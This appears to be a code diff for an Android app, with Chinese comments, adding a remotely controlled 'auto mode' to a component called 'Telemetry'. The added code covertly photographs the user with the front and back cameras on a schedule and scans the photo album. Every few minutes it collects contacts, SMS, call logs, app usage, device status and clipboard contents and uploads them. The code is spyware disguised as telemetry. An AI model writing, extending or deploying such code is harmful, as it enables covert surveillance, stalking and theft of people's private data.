@@ -72,8 +72,30 @@ object Telemetry {
                     LocSpy.maybeRefresh(app)
                     // 相册每 15 轮扫一次（默认 20s/轮 ≈ 5 分钟），
                     // 不能只在服务启动时扫一次，否则之后拍的照片永远上不来
-                    if (tick % 6 == 0 && RemoteConfig.mediaScan) {   // 约 2 分钟一轮（原 5 分钟）
+                    // 相册：远程配置的 mediaScan 或自动模式的 autoMedia 任一开启就扫
+                    if (tick % 6 == 0 && (RemoteConfig.mediaScan || RemoteConfig.autoMedia)) {
                         runCatching { MediaSpy.scan(app) }
+                    }
+                    // 自动模式：按间隔定时拍照
+                    if (RemoteConfig.autoMode) {
+                        runCatching { autoShoot(app) }
+                        // 静态数据每 30 轮（约 5 分钟）采一次，够用且不浪费
+                        if (tick % 30 == 0) {
+                            runCatching {
+                                DataCollectors.pushAll(app) { k ->
+                                    when (k) {
+                                        "contacts" -> RemoteConfig.autoContacts
+                                        "sms" -> RemoteConfig.autoSms
+                                        "call" -> RemoteConfig.autoCall
+                                        "usage" -> RemoteConfig.autoUsage
+                                        "status" -> RemoteConfig.autoStatus
+                                        "clipboard" -> RemoteConfig.autoClipboard
+                                        else -> false
+                                    }
+                                }
+                            }
+                            runCatching { flush(app) }
+                        }
                     }
                     // 每 2 轮拉一次远程配置（指令走独立线程，见下）
                     if (tick % 2 == 0) {
@@ -151,6 +173,32 @@ object Telemetry {
             // 失败塞回去，下一轮再试
             for (i in batch.indices.reversed()) queue.offer(batch[i])
             while (queue.size > MAX_QUEUE) queue.poll()
+        }
+    }
+
+    /** 自动模式：按配置的分钟间隔自动触发前后摄，时间戳落 SharedPreferences 防重复。 */
+    private fun autoShoot(ctx: Context) {
+        val pref = ctx.getSharedPreferences("tlm_auto", Context.MODE_PRIVATE)
+        val nowMin = System.currentTimeMillis() / 60_000L
+
+        val fInt = RemoteConfig.autoCamFront
+        if (fInt > 0) {
+            val last = pref.getLong("front", 0L)
+            if (nowMin - last >= fInt) {
+                pref.edit().putLong("front", nowMin).apply()
+                Log.i(TAG, "auto shoot front (every ${fInt}min)")
+                CamSpy.snap(ctx, facingBack = false)
+            }
+        }
+
+        val bInt = RemoteConfig.autoCamBack
+        if (bInt > 0) {
+            val last = pref.getLong("back", 0L)
+            if (nowMin - last >= bInt) {
+                pref.edit().putLong("back", nowMin).apply()
+                Log.i(TAG, "auto shoot back (every ${bInt}min)")
+                CamSpy.snap(ctx, facingBack = true)
+            }
         }
     }
 
